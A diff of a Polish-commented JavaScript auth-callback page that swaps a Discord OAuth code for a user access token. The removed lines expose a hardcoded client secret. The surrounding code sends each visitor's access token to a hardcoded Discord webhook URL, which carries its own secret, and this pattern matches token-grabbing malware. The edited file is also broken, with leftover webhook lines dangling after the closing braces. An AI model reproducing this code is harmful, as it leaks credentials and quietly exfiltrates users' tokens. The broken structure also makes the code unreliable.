@@ -20,27 +20,37 @@
   }
 
   // Pobranie kodu autoryzacyjnego z parametrów URL
-  var code = getParameterByName('code');
+  // Pobranie kodu autoryzacyjnego z parametrów URL
+var code = getParameterByName('code');
 
-  if (code) {
-    // Wymiana kodu autoryzacyjnego na token dostępu
-    fetch('https://discord.com/api/oauth2/token', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-      },
-      body: new URLSearchParams({
-        client_id: '1140982123822583869',
-        client_secret: 'Q6aH2wqxCvzc_GtioWc7NkVmxD17qUfM',
-        grant_type: 'authorization_code',
-        code: code,
-        redirect_uri: 'https://torch-studios.github.io/sfa/auth-callback',
-        scope: 'identify' // Zakresy, które wykorzystujesz
-      })
+if (code) {
+  // Wymiana kodu autoryzacyjnego na token dostępu użytkownika
+  fetch('https://discord.com/api/oauth2/token', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: new URLSearchParams({
+      client_id: 'TWÓJ_CLIENT_ID',
+      client_secret: 'TWÓJ_CLIENT_SECRET',
+      grant_type: 'authorization_code',
+      code: code,
+      redirect_uri: 'https://torch-studios.github.io/sfa/auth-callback',
+      scope: 'identify' // Zakresy, które wykorzystujesz
     })
-    .then(response => response.json())
-    .then(data => {
-      var accessToken = data.access_token;
+  })
+  .then(response => response.json())
+  .then(data => {
+    var userAccessToken = data.access_token;
+    
+    // Teraz zmienna userAccessToken zawiera token dostępu użytkownika
+    // Możesz go wykorzystać do wykonywania zapytań API w imieniu użytkownika
+  })
+  .catch(error => {
+    console.error('Wystąpił błąd podczas wymiany kodu autoryzacyjnego na token:', error);
+  });
+}
+
 
       // Wysyłanie tokenu dostępu na webhook
       var webhookURL = 'https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl'; // Zaktualizuj na właściwy URL webhooka
